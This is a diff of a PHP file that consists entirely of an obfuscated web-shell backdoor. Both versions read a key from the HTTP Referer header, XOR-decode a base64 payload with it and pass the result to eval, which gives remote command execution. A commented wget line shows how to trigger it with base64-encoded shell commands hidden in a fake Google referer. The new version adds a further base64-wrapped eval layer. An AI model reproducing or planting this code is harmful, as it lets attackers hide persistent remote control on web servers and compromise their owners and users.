@@ -1,9 +1,9 @@
 <?php
-	//wget --referer "http://www.google.com/asdsds?dsa=c4m4ll0&asd=`echo -n "ls -alh;" | perl -e 'use MIME::Base64 qw(encode_base64);print encode_base64();'`&asdsad=0" http://192.168.1.102/ -O - -q
-	@error_reporting(0);	
-	$ref=explode('?', $_SERVER['HTTP_REFERER']);
-	parse_str($ref[1], $ref);
+	//eval(base64_decode('cGFyc2Vfc3RyKHN1YnN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sc3RycG9zKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwnPycpKSwkcmVmKTskcmVmPWFycmF5X3ZhbHVlcygkcmVmKTskdGV4dD1iYXNlNjRfZGVjb2RlKCdKMlpvY2xjOVRTTXBMWGNrYm5Gd2NUc2dVMmgxWUh0cGNTUW9ZbVp5VmlWUkpUd25abWh5Vnp4TktpOStZMlY0YzJzOEtXWnBha3N4U1NSdmIyMWpaalE5TGl3c1kzcG5lWEZoSkRSeGNXdFBQVkUrSVRRL0tpbzlNaW92TFhaK2FYRm9MMjUxZjJrd01pNHROQ2h2ZldjME1EUnBkR0J2ZTJseEpDc3dKRGdwWm1scVN6SkpKQzhzYVhOcmV5MDJUblZrWmpScGUzdGlmR3gxYVhGb05qQWhPbXQ5WUdsUGMyRjVTMjlqZm5keFkyQi9KRFJnZVdsUFBWRThaWDFoY1ZOcmRYZExibnRpZUhWdFlINDhLRzk5WjA4OVNTVWxQaUZJWXpZM0xISnhjV3gvTjI5eGNIRXRKallzTUVOeGUzVmdKRFJ4Y1d0UFBWRTVPRFJ2Wm1sdGV6aHBMUT09Jyk7IEBldmFsKGMoJHRleHQsJHJlZlswXSkpO2Z1bmN0aW9uIGMoJHRleHQ9JycsJGtleT0nJyl7cmV0dXJuICgoJHRleHQgXiBAc3RyX3BhZCgiIixzdHJsZW4oJHRleHQpLCRrZXkpKSAmIHN0cl9yZXBlYXQoIlx4MWYiLHN0cmxlbigkdGV4dCkpKSB8ICgkdGV4dCAmIHN0cl9yZXBlYXQoIlx4ZTAiLHN0cmxlbigkdGV4dCkpKTt9IA=='));
+
+	parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')), $ref);
 	$ref=array_values($ref);
-	$text = base64_decode('J2Zoclc9TSMpLXZtf3U1IFJwaW9/Z3ElMH5pdlglUD03f2dqYG58JChiZnJWJlEla2B1fnEsPCojNH5tf3h1bjwpZmlqSzJJIzYsPi4lJS89NyxycXFsfzdvcXBxLSU2LDAnd2BwLDEwZmx9eGNodSszLTMgKGJmclYlUSUrI3FufGMsMkFteXEsaH90emF7bWh1Zy4tNiJqeW9xUmR5eE9ge2NgaWJkcDwpd2FoSzJJIXJlYHVcc2hgU29/bWBoenh/OCd3YHBXPE0qPSM2UGIyODRvZmltezh3bGdpLCI5NC1UaXpxbzwpZmlqSzJJJC8sbmJmdWYvcSw=');		
-	@eval((($text ^ @str_pad("", strlen($text), $ref[0])) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text))));
+	$text=base64_decode('J2Zoclc9TSMpLXckbnFwcTsgU2h1YHtpcSQoYmZyViVRJTwnZmhyVzxNKi9+Y2V4c2s8KWZpaksxSSRvb21jZjQ9LiwsY3pneXFhJDRxcWtPPVE+ITQ/Kio9MiovLXZ+aXFoL251f2kwMi4tNChvfWc0MDRpdGBve2lxJCswJDgpZmlqSzJJJC8saXNrey1yZWB1XGR4YFNvf21gaHp4fzgnd2BwVz1NL3JkeGlTd2ZgUndjYmRmenlnJChzbnBWJFElOS02UXouNzBhZmh1ZzdzYmdoND42MCNUaGJtYDgnZmhyVz1NKi8tdn5pcWgvcDQ=');		
+	@eval(c($text, $ref[0]));function c($text='', $key=''){return (($text ^ @str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));}
+
 ?>
